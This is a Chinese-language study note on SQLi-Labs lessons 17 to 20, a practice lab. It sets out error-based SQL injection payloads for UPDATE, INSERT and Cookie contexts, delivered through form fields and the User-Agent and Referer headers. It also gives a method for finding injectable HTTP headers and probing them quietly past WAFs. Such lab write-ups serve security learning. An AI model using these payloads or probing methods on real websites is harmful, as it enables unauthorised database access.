# 2026-08-02 SQLi-Labs 进阶实战（Less-17~20）+ 注入点识别技巧

## 一、闭合方式总结：注释法 vs 消费法

之前在 Less-1~16 一直用 `--+` 注释法，但在非 SELECT 注入里遇到了问题，引入了**消费法**的闭合方式。

### 1.1 注释法

| 写法 | 适用场景 | 注意 |
|------|---------|------|
| `' AND xxx --+` | **仅 URL GET 参数** | `+` 会被 URL 解码成空格 |
| `' AND xxx -- ` | 通用 | `--` 后面**必须有一个空格** |
| `' AND xxx #` | MySQL | 在 HTTP Header 里可能被当锚点（`#fragment`），不稳定 |
| `' AND xxx /**/` | 通用 | 多行注释，本身没问题，但后面多余的引号依旧会报错 |

**注释法在 INSERT VALUES 里的致命缺陷**：

```sql
-- 原始 SQL
INSERT INTO uagents (...) VALUES ('输入', 'IP', 'admin');

-- 注入后（用 # 注释）
INSERT INTO uagents (...) VALUES ('' AND xxx #', 'IP', 'admin');
--                                              ↑
--                     # 把后面的 , 'IP', 'admin', ) 全注释掉了
--                     VALUES 的右括号丢了 → 语法错误！
```

所以**注释法在 INSERT VALUES 里必报错**，除非自己补括号（见下文）。

### 1.2 消费法（推荐，实战首选）

**原理**：不依赖注释，用 SQL 逻辑表达式天然消耗掉多余引号，让整个语句语法完整。

```sql
-- 原始 SQL
INSERT INTO uagents (...) VALUES ('输入', 'IP', 'admin');

-- Payload（消费法）
' OR updatexml(1,concat(0x7e,database()),1) OR '

-- 替换后
VALUES ('' OR updatexml(1,concat(0x7e,database()),1) OR '', 'IP', 'admin')
         ↑                                          ↑
    false             报错爆数据              false
```

| 部分 | 作用 |
|------|------|
| 第一个 `'` | 与 VALUES 的 `'` 配对，变成 `''`（空串 = false） |
| `OR updatexml(...)` | false 触发 OR，执行报错注入 |
| 最后的 `OR '` | 消费掉第 1 个值的闭合引号，让 SQL 语法完整 |

**消费法常见变体**：

```sql
-- 1. OR 消费
' OR updatexml(1,concat(0x7e,database()),1) OR '

-- 2. AND 消费（前面需确保为真，如 1=1）
' AND updatexml(1,concat(0x7e,database()),1) AND '

-- 3. extractvalue（更短）
' OR extractvalue(1,concat(0x7e,database())) OR '
```

### 1.3 注释法 + 自补括号（硬要用注释的话）

```sql
-- Payload
' AND updatexml(1,concat(0x7e,database()),1)) -- 

-- 替换后
VALUES ('' AND updatexml(...,1)) -- ', 'IP', 'admin')
                一个 ) 关 updatexml，一个 ) 关 VALUES
```

能用但没必要，消费法更短且不用算括号数量。

---

## 二、Less-17：UPDATE 注入（密码修改场景）

### 2.1 注入点

POST 请求的 **`passwd`** 字段（`uname` 字段被 `check_input()` 过滤了）。

```sql
-- 原始 SQL
UPDATE users SET password = '$passwd' WHERE username = '$uname'
```

### 2.2 前提

**用户名必须存在**（如 `admin`），否则 WHERE 条件不命中，UPDATE 不会执行。

### 2.3 Payload

```sql
-- passwd 字段输入（闭合：'）
' AND updatexml(1,concat(0x7e,database()),1) --+
```

### 2.4 特点

- 注入类型：**UPDATE 注入**
- 不能用 UNION（不是 SELECT）
- 打法：报错注入（updatexml / extractvalue），布尔盲注/时间盲注也能但不必要

---

## 三、Less-18：INSERT 注入（User-Agent 瞒天过海）

### 3.1 注入点

HTTP 请求头 **`User-Agent`**。

```sql
-- 原始 SQL（登录成功后记录日志）
INSERT INTO uagents (uagent, ip_address, username) 
VALUES ('User-Agent值', 'IP地址', '登录用户名')
```

**`uname` 和 `passwd` 被过滤了**，但 User-Agent 没过滤。

### 3.2 前提

必须先**登录成功**，代码才会走到 INSERT 日志那一步。默认账号：**`Dumb / Dumb`**（不是 admin/admin）。

### 3.3 为什么 `--+` 在 Header 里失效

`--+` 只在 URL 参数里有用（服务器对 GET 参数做 URL 解码：`+` → 空格）。在 User-Agent 请求头里 `+` 就是字面量 `+`，MySQL 的 `--` 注释要求后面必须跟空格，所以：

```
User-Agent: ...' --+    → 注释不生效（+ 不是空格）
User-Agent: ...' --     → 注释生效（后面有空格）
User-Agent: ...' #      → 可能被当锚点，不稳定
```

### 3.4 Payload（消费法）

```http
User-Agent: ' OR updatexml(1,concat(0x7e,database()),1) OR '
```

### 3.5 对比

| | Less-17 | Less-18 |
|---|---|---|
| 注入类型 | UPDATE | INSERT |
| 注入位置 | POST `passwd` | Header `User-Agent` |
| 前提条件 | 用户名存在 | 登录成功（Dumb/Dumb） |
| 打法 | updatexml 报错注入 | updatexml 报错注入（消费法） |

---

## 四、Less-19：Referer 注入

与 Less-18 同理，注入点在 **`Referer`** 请求头。

**判断依据**：页面显示 "Your Referer is: xxx"，说明 Referer 被后端读出来并回显了 → 处理了你的输入 → 可能没有过滤。

```http
Referer: ' OR updatexml(1,concat(0x7e,database()),1) OR '
```

---

## 五、Less-20：Cookie 注入 + PRG 模式

### 5.1 请求流程

```
POST /Less-20/  →  验证登录，Set-Cookie: uname=admin
       ↓ 302 重定向
GET  /Less-20/  →  携带 Cookie: uname=admin
                    SELECT * FROM users WHERE username='admin'  ← 注入点！
```

**这是标准的 PRG 模式（Post-Redirect-Get）**：
- POST 负责登录验证 + 种 Cookie
- GET 负责读取 Cookie 查数据库显示信息
- 302 跳一下是为了防止刷新时重复提交表单

### 5.2 注入点

**第二个 GET 请求的 Cookie `uname` 字段**。

```http
Cookie: uname=admin' AND updatexml(1,concat(0x7e,database()),1) -- 
```

### 5.3 为什么刷新后注入"失效"

你在 Burp 里修改的 Cookie 只影响**单次拦截的请求**。浏览器本地存的 Cookie 还是登录时服务器 Set-Cookie 的 `admin`。

```
Burp 拦截修改 → 发送注入 Payload → 注入成功 ✅
浏览器刷新   → 发送本地 Cookie: uname=admin → 正常查询 ❌
```

想反复注入用 Burp **Repeater**，不用浏览器刷新。

---

## 六、注入点识别方法论

### 6.1 能直接判断的

- **URL 参数 / 表单字段**：一定传到后端，必测
- **响应里有回显**：页面展示了你的输入内容 → 说明被读被处理了

### 6.2 高频注入点（按概率排序）

| 请求头 | 后端典型用途 | 注入可能性 |
|--------|------------|-----------|
| **User-Agent** | 访问日志、设备统计 | ★★★ 极高 |
| **X-Forwarded-For** | 获取真实 IP（CDN 后） | ★★★ 高 |
| **Cookie** | 身份标识、偏好 | ★★★ 高 |
| **Referer** | 来源统计、防盗链 | ★★☆ 中 |
| **X-Real-IP** | 类似 X-Forwarded-For | ★★☆ 中 |
| **Accept-Language** | 国际化 | ★☆☆ 低 |

> User-Agent + X-Forwarded-For + Cookie 这三个优先测，覆盖 90% 场景。

### 6.3 标记值探测法（低成本测试）

不直接上 Payload，先用**独特标记字符串**试探：

```
X-Forwarded-For: INJECT_TEST_12345
User-Agent: INJECT_TEST_12345
Referer: http://INJECT_TEST_12345.com/
```

- 翻响应内容搜索 `INJECT_TEST_12345`
- 看页面是否行为变化（报错/内容不同）
- 有回显 → 上闭合测试（`'`, `"`, `)`）
- 没回显但有理由怀疑 → 时间盲注试

**标记值探测比直接上 Payload 快 10 倍且不触发 WAF。**

### 6.4 SQLi-Labs 的规律

每关的页面输出直接暴露了注入位置：

| 关 | 页面特征 | 注入位置 |
|----|---------|---------|
| Less-1~4 | "Please input the ID" | GET `?id=` |
| Less-11~12 | Login 表单 | POST `uname` / `passwd` |
| Less-17 | Password Reset 表单 | POST `passwd` |
| Less-18 | "Your User Agent is: xxx" | Header `User-Agent` |
| Less-19 | "Your Referer is: xxx" | Header `Referer` |
| Less-20 | Cookie 操作 | Cookie `uname` |

> **页面展示什么，那个字段大概率就是注入点。**

---

## 七、布尔盲注 vs 时间盲注的场景选择

| | 布尔盲注 | 时间盲注 |
|---|---|---|
| 依赖 | 响应内容/状态的差异 | 响应时间 |
| 速度 | 快（每字符 ~7 请求） | 慢（每字符 ~7 请求，每个等 3 秒） |
| 适用 | 有真假差异的场景 | 完全一致的响应 |

### 7.1 什么时候只能时间盲注

1. **响应完全静态**：`?id=1' AND 1=1 --+` 和 `?id=1' AND 1=2 --+` 返回一模一样的页面
2. **INSERT / UPDATE / DELETE 注入**：不回显数据，只返回 "操作成功"
3. **后端统一错误处理**：所有异常都返回相同的 JSON `{"code": -1}`
4. **无回显 API / 异步接口**：直接 `return ok`，不管数据库发生了什么

> 能用布尔就不用时间。布尔盲注 8 位字符约 56 个请求，时间盲注假设 3 秒延迟就是 168 秒。

---

## 八、总结

- **闭合方式**：优先消费法（`' OR xxx OR '`），不依赖注释，更可靠
- **非 SELECT 注入**：INSERT/UPDATE/DELETE 不能用 UNION，用报错注入或时间盲注
- **注入点识别**：User-Agent / X-Forwarded-For / Cookie 优先测 + 标记值探测
- **Less-17~20**：UPDATE → INSERT（User-Agent）→ INSERT（Referer）→ Cookie（SELECT），层层推进
